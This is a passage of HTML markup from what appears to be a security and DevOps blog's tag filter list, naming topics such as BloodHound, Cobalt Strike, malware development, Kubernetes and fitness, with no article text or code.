ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-BloodHound" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="BloodHound" id="tag-BloodHound" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>BloodHound</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Brute Force" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Brute Force" id="tag-Brute Force" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Brute Force</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-C#" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="C#" id="tag-C#" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>C#</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-C2 Framework" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="C2 Framework" id="tag-C2 Framework" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>C2 Framework</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Certifications" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Certifications" id="tag-Certifications" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Certifications</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-CI/CD" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="CI/CD" id="tag-CI/CD" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>CI/CD</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Cloud Architecture" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Cloud Architecture" id="tag-Cloud Architecture" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Cloud Architecture</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Cobalt Strike" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Cobalt Strike" id="tag-Cobalt Strike" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Cobalt Strike</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-CSRF Bypass" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="CSRF Bypass" id="tag-CSRF Bypass" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>CSRF Bypass</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Desktop Application" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Desktop Application" id="tag-Desktop Application" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Desktop Application</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-DevOps" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="DevOps" id="tag-DevOps" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>DevOps</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-DevSecOps" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="DevSecOps" id="tag-DevSecOps" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>DevSecOps</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-EDR Setup" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="EDR Setup" id="tag-EDR Setup" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>EDR Setup</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Educational" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Educational" id="tag-Educational" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Educational</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Elastic EDR" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Elastic EDR" id="tag-Elastic EDR" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Elastic EDR</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-eLearnSecurity" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="eLearnSecurity" id="tag-eLearnSecurity" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>eLearnSecurity</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Exam" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Exam" id="tag-Exam" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Exam</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Fitness" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Fitness" id="tag-Fitness" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Fitness</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-GitHub" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="GitHub" id="tag-GitHub" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>GitHub</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-GitOps" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="GitOps" id="tag-GitOps" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>GitOps</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-IDS Evasion" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="IDS Evasion" id="tag-IDS Evasion" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>IDS Evasion</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Improper Asset Management" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Improper Asset Management" id="tag-Improper Asset Management" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Improper Asset Management</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-INE" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="INE" id="tag-INE" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>INE</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Infrastructure as Code" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Infrastructure as Code" id="tag-Infrastructure as Code" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Infrastructure as Code</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Kubernetes" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Kubernetes" id="tag-Kubernetes" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Kubernetes</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Linux" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Linux" id="tag-Linux" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Linux</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Maldev" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Maldev" id="tag-Maldev" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Maldev</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Malware Lab" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Malware Lab" id="tag-Malware Lab" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Malware Lab</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Network Security" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Network Security" id="tag-Network Security" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Network Security</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Open Source" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Open Source" id="tag-Open Source" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Open Source</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Payload Hiding" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Payload Hiding" id="tag-Payload Hiding" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Payload Hiding</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Payload Stager" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Payload Stager" id="tag-Payload Stager" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Payload Stager</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Penetration testing" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Penetration testing" id="tag-Penetration testing" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Penetration testing</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Penetration Testing" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Penetration Testing" id="tag-Penetration Testing" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Penetration Testing</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-PostgreSQL" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="PostgreSQL" id="tag-PostgreSQL" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>PostgreSQL</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-PowerShell" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="PowerShell" id="tag-PowerShell" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>PowerShell</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-React" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="React" id="tag-React" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>React</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Red team" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Red team" id="tag-Red team" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Red team</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Redis" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Redis" id="tag-Redis" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Redis</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Reverse Engineering" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Reverse Engineering" id="tag-Reverse Engineering" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Reverse Engineering</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Security" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Security" id="tag-Security" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Security</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Shellcode Encryption" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Shellcode Encryption" id="tag-Shellcode Encryption" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Shellcode Encryption</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-SQL" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="SQL" id="tag-SQL" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>SQL</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-SQLite" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="SQLite" id="tag-SQLite" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>SQLite</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Stealth Techniques" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Stealth Techniques" id="tag-Stealth Techniques" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Stealth Techniques</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Steganography" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Steganography" id="tag-Steganography" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Steganography</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Terraform" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Terraform" id="tag-Terraform" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Terraform</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-TypeScript" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="TypeScript" id="tag-TypeScript" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>TypeScript</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-VBS" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="VBS" id="tag-VBS" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>VBS</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Visual Studio" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Visual Studio" id="tag-Visual Studio" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Visual Studio</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Web Security" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Web Security" id="tag-Web Security" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Web Security</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-Windows Forms" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="Windows Forms" id="tag-Windows Forms" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" data-astro-cid-vavxtnxe>Windows Forms</div> <span class="text-slate-400 ml-1" data-astro-cid-vavxtnxe>(1)</span> </label><label class="tag-item cursor-pointer items-center p-1 mb-1 hover:bg-slate-700 rounded select-none border-sky-600 [&:has(input:checked)]:bg-sky-600/20 [&:has(input:checked)]:border-l-2" for="tag-xxd" data-astro-cid-vavxtnxe> <input type="checkbox" name="tags" value="xxd" id="tag-xxd" class="hidden accent-sky-600 mr-2 cursor-pointer" data-astro-cid-vavxtnxe> <div class="flex-wrap wrap-anywhere hyphens-auto" 